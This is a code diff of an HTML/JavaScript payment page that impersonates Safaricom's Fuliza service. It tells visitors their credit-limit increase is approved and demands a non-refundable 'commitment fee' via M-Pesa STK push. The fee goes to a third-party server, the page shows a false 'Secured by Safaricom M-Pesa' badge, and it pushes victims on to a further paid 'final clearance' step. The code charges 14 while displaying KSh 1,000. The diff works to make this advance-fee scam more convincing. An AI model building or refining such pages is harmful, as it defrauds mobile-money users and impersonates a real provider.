@@ -3,212 +3,121 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Commitment Fee Payment</title>
+<title>Customer Commitment Fee</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#eef2ff;min-height:100vh;}
 
-.top-bar{
-  background:linear-gradient(135deg,#1fb141,#16903a);
-  padding:14px;
-  text-align:center;
-  color:#fff;
-  font-weight:700;
-  font-size:18px;
-  box-shadow:0 2px 8px rgba(0,0,0,.15);
-}
+.top-bar{background:linear-gradient(135deg,#3b5bdb,#2344c7);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
 
-.page-wrap{max-width:430px;margin:36px auto;padding:0 12px;}
+.page-wrap{max-width:430px;margin:36px auto 30px;padding:0 12px;}
 
 .step-badge{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
-.step-dot{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;}
-.step-line{flex:1;height:2px;background:#d4edda;}
-.step-label{font-size:12.5px;color:#888;}
+.step-dot{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#3b5bdb,#2344c7);color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.step-line{flex:1;height:2px;background:#c5d0fa;border-radius:2px;}
+.step-label{font-size:12.5px;color:#888;white-space:nowrap;}
 
-.invoice-card{
-  background:#fff;
-  border-radius:16px;
-  box-shadow:0 8px 30px rgba(0,0,0,.1);
-  overflow:hidden;
-  margin-bottom:16px;
-}
+.invoice-card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);overflow:hidden;margin-bottom:16px;}
 
-.invoice-header{
-  background:linear-gradient(135deg,#1fb141,#16903a);
-  padding:22px;
-  color:#fff;
-}
+.invoice-header{background:linear-gradient(135deg,#3b5bdb,#2344c7);padding:22px 24px 18px;color:#fff;}
+.invoice-header-top{display:flex;justify-content:space-between;align-items:flex-start;}
+.invoice-title{font-size:16px;font-weight:700;letter-spacing:.2px;}
+.invoice-tag{background:rgba(255,255,255,.2);font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;letter-spacing:.5px;}
+.invoice-limit{margin-top:10px;font-size:13px;opacity:.85;}
+.invoice-limit span{font-weight:700;opacity:1;}
 
-.invoice-title{font-size:16px;font-weight:700;}
-.invoice-limit{margin-top:10px;font-size:13px;}
-.invoice-limit span{font-weight:700;}
+.invoice-amount-row{display:flex;align-items:baseline;gap:6px;margin-top:18px;padding-top:16px;border-top:1px solid rgba(255,255,255,.25);}
+.invoice-currency{font-size:20px;font-weight:700;opacity:.85;}
+.invoice-amount{font-size:48px;font-weight:800;line-height:1;letter-spacing:-1px;}
+.invoice-label{font-size:12px;opacity:.75;align-self:flex-end;padding-bottom:6px;}
 
-.invoice-amount-row{
-  display:flex;
-  align-items:baseline;
-  gap:6px;
-  margin-top:18px;
-  padding-top:16px;
-  border-top:1px solid rgba(255,255,255,.25);
-}
+.checklist{padding:18px 24px;}
+.checklist-title{font-size:12px;color:#999;font-weight:600;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;}
+.check-item{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;}
+.check-icon{width:20px;height:20px;border-radius:50%;background:#e8eeff;color:#3b5bdb;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.check-text{font-size:13.5px;color:#444;line-height:1.45;}
 
-.invoice-currency{font-size:20px;font-weight:700;}
-.invoice-amount{font-size:48px;font-weight:800;}
-.invoice-label{font-size:12px;}
+.invoice-divider{height:1px;background:#f0f0f0;margin:0 24px;}
 
-.instructions{
-  margin-top:16px;
-  font-size:14px;
-  color:#555;
-  line-height:1.5;
-}
+.commitment-note{margin:0 24px;padding:14px;background:#eef2ff;border-left:4px solid #3b5bdb;border-radius:4px;font-size:12.5px;color:#2344c7;line-height:1.6;}
 
-.pay-section{
-  background:#fff;
-  border-radius:16px;
-  box-shadow:0 8px 30px rgba(0,0,0,.1);
-  padding:24px;
-  margin-top:20px;
-}
+.pay-section{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:24px;}
+.pay-section-title{font-size:14px;font-weight:700;color:#1a1a2e;margin-bottom:4px;}
+.pay-section-sub{font-size:12.5px;color:#888;margin-bottom:16px;}
 
-.phone-wrap{
-  display:flex;
-  align-items:center;
-  border:2px solid #ddd;
-  border-radius:10px;
-  overflow:hidden;
-}
+.phone-wrap{display:flex;align-items:center;border:2px solid #ddd;border-radius:10px;overflow:hidden;transition:border-color .2s;}
+.phone-wrap:focus-within{border-color:#3b5bdb;}
+.phone-wrap.invalid{border-color:#e74c3c;}
+.phone-wrap.valid{border-color:#3b5bdb;}
+.phone-prefix{background:#eef2ff;color:#3b5bdb;font-weight:700;font-size:16px;padding:13px 12px;border-right:2px solid #ddd;white-space:nowrap;user-select:none;}
+.phone-input{flex:1;border:none;outline:none;padding:13px 12px;font-size:16px;color:#333;background:transparent;}
+.phone-status{padding:0 12px;font-size:18px;}
+.phone-hint{font-size:12px;color:#888;margin-top:5px;}
 
-.phone-prefix{
-  background:#e8f5e9;
-  color:#1fb141;
-  font-weight:700;
-  font-size:16px;
-  padding:13px 12px;
-  border-right:2px solid #ddd;
-}
+.pay-btn{margin-top:18px;width:100%;padding:15px;background:linear-gradient(135deg,#3b5bdb,#2344c7);border:none;color:#fff;font-size:16px;font-weight:600;border-radius:30px;cursor:pointer;transition:transform .15s,box-shadow .15s;letter-spacing:.3px;}
+.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 20px rgba(59,91,219,.4);}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
 
-.phone-input{
-  flex:1;
-  border:none;
-  outline:none;
-  padding:13px;
-  font-size:16px;
-}
-
-.pay-btn{
-  margin-top:18px;
-  width:100%;
-  padding:15px;
-  background:linear-gradient(135deg,#1fb141,#16903a);
-  border:none;
-  color:#fff;
-  font-size:16px;
-  font-weight:600;
-  border-radius:30px;
-  cursor:pointer;
-}
-
-.pay-btn:disabled{
-  background: #a0cfa3;
-  cursor: not-allowed;
-}
-
-.spinner{
-  margin-top:16px;
-  display:none;
-  flex-direction:column;
-  align-items:center;
-}
-
-.loader{
-  border:4px solid #f3f3f3;
-  border-top:4px solid #1fb141;
-  border-radius:50%;
-  width:34px;
-  height:34px;
-  animation:spin 1s linear infinite;
-}
-
+.spinner{margin-top:16px;display:none;flex-direction:column;align-items:center;gap:8px;}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #3b5bdb;border-radius:50%;width:34px;height:34px;animation:spin 1s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg);}}
+.spinner-text{font-size:13px;color:#666;}
 
-.status-msg{
-  margin-top:14px;
-  font-size:14px;
-  font-weight:500;
-  padding:10px;
-  border-radius:8px;
-  display:none;
-}
-
+.status-msg{margin-top:14px;font-size:14px;font-weight:500;padding:10px 14px;border-radius:8px;display:none;}
+.status-msg.info{background:#eef2ff;color:#2344c7;}
 .status-msg.error{background:#fdecea;color:#c0392b;}
-.status-msg.info{background:#e8f5e9;color:#1a7a35;}
 
-.overlay{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.55);
-  display:flex;
-  align-items:flex-end;
-  justify-content:center;
-  opacity:0;
-  pointer-events:none;
-  transition:opacity .3s;
-}
+.secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-size:12px;color:#aaa;}
 
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:1000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
 .overlay.show{opacity:1;pointer-events:all;}
 
-.popup{
-  background:#fff;
-  border-radius:22px 22px 0 0;
-  width:100%;
-  max-width:480px;
-  padding-bottom:30px;
-  transform:translateY(100%);
-  transition:transform .4s;
-}
-
+.popup{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:480px;padding:0 0 30px;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,1.15,.6,1);box-shadow:0 -8px 40px rgba(0,0,0,.25);}
 .overlay.show .popup{transform:translateY(0);}
 
-.popup-header.success{
-  background:linear-gradient(135deg,#1fb141,#16903a);
-  padding:28px;
-  text-align:center;
-  color:white;
-}
+.popup-header{border-radius:22px 22px 0 0;padding:28px 24px 22px;text-align:center;}
+.popup-header.success{background:linear-gradient(135deg,#3b5bdb,#2344c7);}
+.popup-header.failure{background:linear-gradient(135deg,#e74c3c,#c0392b);}
+.popup-header.confirm{background:linear-gradient(135deg,#f39c12,#d68910);}
+.popup-icon{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:30px;}
+.popup-title{color:#fff;font-size:20px;font-weight:700;}
+.popup-subtitle{color:rgba(255,255,255,.85);font-size:13.5px;margin-top:4px;}
 
-.popup-icon{
-  font-size:30px;
-  margin-bottom:10px;
-}
+.receipt-body{padding:20px 24px 0;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-label{color:#888;font-weight:500;}
+.receipt-value{color:#1a1a2e;font-weight:600;text-align:right;max-width:60%;}
 
-.popup-title{font-size:20px;font-weight:700;}
+.purpose-note{margin:16px 24px 0;background:#eef2ff;border-left:4px solid #3b5bdb;border-radius:4px;padding:10px 14px;font-size:13px;color:#2344c7;line-height:1.5;}
+.purpose-note.failure-note{background:#fff5f5;border-left-color:#e74c3c;color:#8b0000;}
 
-.receipt-body{padding:20px;}
+.countdown-wrap{margin:20px 24px 0;text-align:center;}
+.countdown-text{font-size:13.5px;color:#666;margin-bottom:8px;}
+.countdown-text span{font-weight:700;color:#3b5bdb;font-size:16px;}
+.progress-bar-bg{background:#eef2ff;border-radius:100px;height:6px;overflow:hidden;}
+.progress-bar-fill{background:linear-gradient(90deg,#3b5bdb,#2344c7);height:100%;border-radius:100px;transition:width 1s linear;}
 
-.receipt-row{
-  display:flex;
-  justify-content:space-between;
-  padding:8px 0;
-  border-bottom:1px solid #eee;
-}
+.popup-actions{display:flex;gap:12px;padding:20px 24px 0;}
+.btn-proceed{flex:1;padding:14px;background:linear-gradient(135deg,#3b5bdb,#2344c7);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;}
+.btn-proceed:hover{transform:translateY(-2px);box-shadow:0 4px 14px rgba(59,91,219,.4);}
+.btn-retry{flex:1;padding:14px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s;}
+.btn-retry:hover{transform:translateY(-2px);}
+.btn-close{flex:1;padding:14px;background:#fff;color:#555;border:2px solid #ddd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:border-color .15s;}
+.btn-close:hover{border-color:#aaa;}
 
-.popup-actions{padding:20px;text-align:center;}
+.confirm-body{padding:20px 24px 0;text-align:center;font-size:14px;color:#555;line-height:1.6;}
+.confirm-sms-note{margin:14px 24px 0;background:#fffbf0;border-left:4px solid #f39c12;border-radius:4px;padding:10px 14px;font-size:13px;color:#7d5a00;line-height:1.5;text-align:left;}
 
-.btn-proceed{
-  padding:14px 24px;
-  background:#1fb141;
-  color:#fff;
-  border:none;
-  border-radius:30px;
-  font-weight:600;
-  cursor:pointer;
+@media(max-width:480px){
+  .page-wrap{margin:20px auto;padding:0 10px;}
+  .popup{border-radius:18px 18px 0 0;}
 }
 </style>
 </head>
 <body>
 
-<header class="top-bar">Safaricom Fuliza Verification</header>
+<header class="top-bar">Safaricom Fuliza — Step 3 of 4</header>
 
 <div class="page-wrap">
 
@@ -220,162 +129,366 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 
   <div class="invoice-card">
     <div class="invoice-header">
-      <div class="invoice-title">Commitment Fee Invoice</div>
-      <div class="invoice-limit">Selected Fuliza Limit: <span id="limit"></span></div>
+      <div class="invoice-header-top">
+        <div class="invoice-title">Commitment Fee Invoice</div>
+        <div class="invoice-tag">STEP 3</div>
+      </div>
+      <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
         <div class="invoice-amount">1000</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
-  </div>
 
-  <div class="instructions">
-    <p>Dear Customer, your Fuliza limit increase request has been approved. To finalize the upgrade, please complete the <strong>Customer Commitment Fee</strong> below. This confirms your request and allows our system to <strong>automatically refresh your current limit to the new limit you selected</strong>.</p>
-    <p>Complete this step to proceed to the <strong>final Fuliza limit activation stage</strong>. Once completed, your upgraded limit will be processed immediately.</p>
+    <div class="checklist">
+      <div class="checklist-title">What this fee covers</div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Confirms your commitment to the Fuliza limit upgrade request</div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Authorizes our system to proceed with the limit refresh process</div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Unlocks the final clearance step to complete your upgrade</div>
+      </div>
+    </div>
+
+    <div class="invoice-divider"></div>
+
+    <div class="commitment-note" style="margin:14px 24px;padding:12px 14px;">
+      ⚠️ <strong>Important:</strong> This Commitment Fee confirms that your Fuliza limit upgrade request is genuine and authorised by you. It is a one-time, non-refundable fee that secures your position in the upgrade queue and is required before the final clearance step can be initiated.
+    </div>
+
+    <div style="padding:14px 24px;font-size:12px;color:#aaa;text-align:center;">
+      This invoice is generated once per upgrade request and is non-refundable.
+    </div>
   </div>
 
   <div class="pay-section">
-    <div class="phone-wrap">
-      <span class="phone-prefix">254</span>
-      <input class="phone-input" id="phone" placeholder="7XXXXXXXX">
-    </div>
+    <div class="pay-section-title">Pay via M-Pesa STK Push</div>
+    <div class="pay-section-sub">A payment prompt will be sent directly to your phone.</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1000 Now</button>
+    <div class="phone-wrap" id="phoneWrap">
+      <span class="phone-prefix">254</span>
+      <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+      <span class="phone-status" id="phoneStatus"></span>
+    </div>
+    <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
+
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 1,000 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
+      <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>
     </div>
 
     <div class="status-msg" id="statusMsg"></div>
+
+    <div class="secure-note">🔒 Secured by Safaricom M-Pesa</div>
   </div>
 
 </div>
 
+<!-- Success Popup -->
 <div class="overlay" id="successOverlay">
   <div class="popup">
     <div class="popup-header success">
       <div class="popup-icon">✅</div>
-      <div class="popup-title">Payment Successful</div>
+      <div class="popup-title">Commitment Fee Paid!</div>
+      <div class="popup-subtitle">Your upgrade commitment is confirmed</div>
     </div>
     <div class="receipt-body">
-      <div class="receipt-row"><span>Amount</span><span>KSh 1000</span></div>
-      <div class="receipt-row"><span>Status</span><span>Completed</span></div>
+      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#3b5bdb;">Completed ✓</span></div>
+    </div>
+    <div class="purpose-note" id="rPurpose">
+      Commitment fee received — your Fuliza limit upgrade is confirmed. One final clearance step remains to activate your new limit.
+    </div>
+    <div class="countdown-wrap">
+      <div class="countdown-text">Redirecting to final step in <span id="countdownNum">10</span>s</div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:100%;"></div></div>
     </div>
     <div class="popup-actions">
-      <button class="btn-proceed" onclick="goNext()">Continue</button>
+      <button class="btn-proceed" onclick="goNext()">Final Step →</button>
+    </div>
+  </div>
+</div>
+
+<!-- Self-confirm Popup -->
+<div class="overlay" id="confirmOverlay">
+  <div class="popup">
+    <div class="popup-header confirm">
+      <div class="popup-icon">❓</div>
+      <div class="popup-title">Did you receive an M-Pesa SMS?</div>
+      <div class="popup-subtitle">We haven't received automatic confirmation yet</div>
+    </div>
+    <div class="confirm-body">
+      If Safaricom sent you a confirmation message saying your payment was successful, tap <strong>Yes, I Paid</strong> to continue.
+    </div>
+    <div class="confirm-sms-note">
+      📩 Check your M-Pesa messages. If you see a confirmation SMS with KSh 1,000 deducted, your payment went through.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="manualConfirm()">Yes, I Paid ✓</button>
+      <button class="btn-retry" onclick="manualFail()">No, Retry</button>
+    </div>
+  </div>
+</div>
+
+<!-- Failure Popup -->
+<div class="overlay" id="failureOverlay">
+  <div class="popup">
+    <div class="popup-header failure">
+      <div class="popup-icon">❌</div>
+      <div class="popup-title">Payment Failed</div>
+      <div class="popup-subtitle">Commitment fee could not be collected</div>
+    </div>
+    <div class="purpose-note failure-note" id="failureReason">
+      Please check your M-Pesa PIN and balance, then try again to proceed.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>
+      <button class="btn-close" onclick="closeFailure()">Close</button>
     </div>
   </div>
 </div>
 
 <script>
-const BACKEND = "https://mpayafrica-server.onrender.com"; // live server
-const COMMITMENT_FEE = 14;
+const BACKEND = "https://mpayafrica-server.onrender.com";
+
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 document.getElementById("limit").innerText = selectedAmount;
 
-async function payNow() {
-  const phone = document.getElementById("phone").value.trim();
-  const status = document.getElementById("statusMsg");
-  const spinner = document.getElementById("spinner");
-  const payBtn = document.getElementById("payBtn");
+const COMMITMENT_FEE = 14;
 
-  if (phone.length !== 9 || !phone.startsWith("7")) {
-    status.style.display = "block";
-    status.className = "status-msg error";
-    status.innerText = "Enter valid Safaricom number starting with 7";
+const phoneInput  = document.getElementById("phone");
+const phoneWrap   = document.getElementById("phoneWrap");
+const phoneStatus = document.getElementById("phoneStatus");
+const phoneHint   = document.getElementById("phoneHint");
+
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);
+  validatePhoneUI(phoneInput.value);
+});
+
+function validatePhoneUI(val) {
+  if (val.length === 0) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = "Enter 9 digits after 254 — must start with 7 (e.g. 712345678)";
+    return false;
+  }
+  if (val.length < 9) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    return false;
+  }
+  if (!val.startsWith("7")) {
+    phoneWrap.className = "phone-wrap invalid";
+    phoneStatus.innerText = "✗";
+    phoneStatus.style.color = "#e74c3c";
+    phoneHint.style.color = "#e74c3c";
+    phoneHint.innerText = "Must start with 7 — Safaricom only (e.g. 7XXXXXXXX)";
+    return false;
+  }
+  phoneWrap.className = "phone-wrap valid";
+  phoneStatus.innerText = "✓";
+  phoneStatus.style.color = "#3b5bdb";
+  phoneHint.style.color = "#3b5bdb";
+  phoneHint.innerText = "Valid Safaricom number ✓";
+  return true;
+}
+
+function showStatus(msg, type) {
+  const el = document.getElementById("statusMsg");
+  el.innerText = msg;
+  el.className = "status-msg " + type;
+  el.style.display = "block";
+}
+function hideStatus() { document.getElementById("statusMsg").style.display = "none"; }
+function setSpinner(show, text) {
+  document.getElementById("spinner").style.display = show ? "flex" : "none";
+  if (text) document.getElementById("spinnerText").innerText = text;
+}
+function setPayBtn(disabled) { document.getElementById("payBtn").disabled = disabled; }
+
+let pollInterval = null;
+let redirectTimer = null;
+let currentPhone = null;
+
+async function payNow() {
+  const digits = phoneInput.value.trim();
+  if (!validatePhoneUI(digits)) {
+    showStatus("Please enter a valid Safaricom number (starts with 7, 9 digits after 254).", "error");
     return;
   }
 
-  const fullPhone = "254" + phone;
-
-  // Disable button & show spinner
-  payBtn.disabled = true;
-  spinner.style.display = "flex";
-  status.style.display = "block";
-  status.className = "status-msg info";
-  status.innerText = "Processing payment...";
+  const fullPhone = "254" + digits;
+  currentPhone = fullPhone;
+  hideStatus();
+  setSpinner(true, "Sending STK Push to your phone…");
+  setPayBtn(true);
 
   let data;
-
   try {
-    const res = await fetch(`${BACKEND}/api/stk-push`, {
+    const res = await fetch(BACKEND + "/api/stk-push", {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        phone_number: fullPhone,
         amount: COMMITMENT_FEE,
-        user_reference: "Fuliza Commitment Fee",
-        payment_id: "commitment_fee"
-      })
+        phone_number: fullPhone,
+        user_reference: "Fuliza Customer Commitment Fee",
+        payment_id: "wallet",
+      }),
     });
     data = await res.json();
   } catch (err) {
-    spinner.style.display = "none";
-    payBtn.disabled = false;
-    status.style.display = "block";
-    status.className = "status-msg error";
-    status.innerText = "Server error. Try again.";
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
     return;
   }
 
-  if (!data.success || !data.checkoutRequestId) {
-    spinner.style.display = "none";
-    payBtn.disabled = false;
-    status.style.display = "block";
-    status.className = "status-msg error";
-    status.innerText = data.message || "Payment initiation failed.";
+  if (!data.success) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus(data.message || data.error || "Payment initiation failed. Please try again.", "error");
     return;
   }
 
-  // Start polling
-  startPolling(data.checkoutRequestId, payBtn, spinner, status);
+  const checkoutId = data.checkoutRequestId;
+  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
+  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
+
+  if (!checkoutId) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
+    return;
+  }
+
+  startPolling(checkoutId, fullPhone);
 }
 
-function startPolling(reference, payBtn, spinner, status) {
+function startPolling(checkoutId, phone) {
   let attempts = 0;
-  const interval = setInterval(async () => {
+  clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
     attempts++;
-    if (attempts > 40) { // ~2 minutes
-      clearInterval(interval);
-      spinner.style.display = "none";
-      payBtn.disabled = false;
-      status.style.display = "block";
-      status.className = "status-msg error";
-      status.innerText = "Payment timeout. Please retry.";
+    if (attempts === 10) {
+      setSpinner(true, "Still waiting for confirmation…");
+    }
+    if (attempts > 40) {
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+      showSelfConfirm();
       return;
     }
-
     try {
-      const res = await fetch(`${BACKEND}/receipt/${reference}`);
+      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
       const data = await res.json();
-
-      if (data.success && data.status === "success") {
-        clearInterval(interval);
-        spinner.style.display = "none";
-        document.getElementById("successOverlay").classList.add("show");
-        return;
+      if (data.status === "pending" || data.status === "not_found") return;
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+      if (data.status === "success" && data.receipt) {
+        showSuccessPopup(data.receipt, phone);
+      } else if (data.status === "failed") {
+        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
       }
-
-      if (data.status === "failed") {
-        clearInterval(interval);
-        spinner.style.display = "none";
-        payBtn.disabled = false;
-        status.style.display = "block";
-        status.className = "status-msg error";
-        status.innerText = "Payment failed: " + (data.reason || "Unknown error");
-      }
-
-    } catch (e) {
-      // ignore intermittent fetch errors
-    }
+    } catch (_) {}
   }, 3000);
+
+  setTimeout(() => {
+    if (pollInterval !== null) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+      setSpinner(false);
+      hideStatus();
+      showSelfConfirm();
+    }
+  }, 32000);
+}
+
+function showSelfConfirm() {
+  document.getElementById("confirmOverlay").classList.add("show");
+}
+
+function manualConfirm() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showSuccessPopup({
+    receiptNumber: "Check M-Pesa SMS",
+    amount: COMMITMENT_FEE,
+    phone: currentPhone,
+    transactionDate: new Date().toLocaleString("en-KE"),
+    purpose: "Fuliza Customer Commitment Fee",
+  }, currentPhone);
+}
+
+function manualFail() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showFailurePopup("Payment was not completed. Please try again.");
+}
+
+function showSuccessPopup(receipt, fallbackPhone) {
+  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
+  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || COMMITMENT_FEE);
+  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
+  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
+  document.getElementById("successOverlay").classList.add("show");
+  startCountdown(10);
+}
+
+function startCountdown(seconds) {
+  clearTimeout(redirectTimer);
+  const total = seconds;
+  let remaining = seconds;
+  document.getElementById("countdownNum").innerText = remaining;
+  document.getElementById("progressFill").style.width = "100%";
+  const tick = () => {
+    remaining--;
+    document.getElementById("countdownNum").innerText = remaining;
+    document.getElementById("progressFill").style.width = ((remaining / total) * 100) + "%";
+    if (remaining <= 0) { goNext(); return; }
+    redirectTimer = setTimeout(tick, 1000);
+  };
+  redirectTimer = setTimeout(tick, 1000);
 }
 
 function goNext() {
+  clearTimeout(redirectTimer);
   window.location.href = "payment4.html";
 }
-</script>
 
+function showFailurePopup(reason) {
+  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+  document.getElementById("failureOverlay").classList.add("show");
+}
+
+function retryPayment() {
+  document.getElementById("failureOverlay").classList.remove("show");
+  setPayBtn(false);
+  hideStatus();
+  clearInterval(pollInterval);
+  clearTimeout(redirectTimer);
+}
+
+function closeFailure() {
+  document.getElementById("failureOverlay").classList.remove("show");
+}
+</script>
 </body>
-      </html>
+</html>
